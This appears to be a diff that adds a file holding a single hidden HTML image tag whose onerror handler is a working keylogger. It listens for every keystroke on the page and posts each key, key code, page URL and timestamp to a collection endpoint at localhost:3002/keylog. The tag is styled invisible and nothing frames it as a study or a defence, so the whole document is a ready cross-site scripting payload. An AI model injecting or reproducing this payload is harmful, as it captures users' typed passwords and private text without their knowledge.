@@ -1,0 +1,22 @@
+<img src="x" onerror="
+let lastKey = '';
+let lastTime = 0;
+document.addEventListener('keydown', function(e) {
+  const now = Date.now();
+  // Only send if it's a different key or enough time has passed
+  if (e.key !== lastKey || now - lastTime > 100) {
+    fetch('http://localhost:3002/keylog', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        key: e.key,
+        code: e.code,
+        page: window.location.href,
+        timestamp: now
+      })
+    }).catch(console.error);
+    lastKey = e.key;
+    lastTime = now;
+  }
+});
+" style="display:none;" />
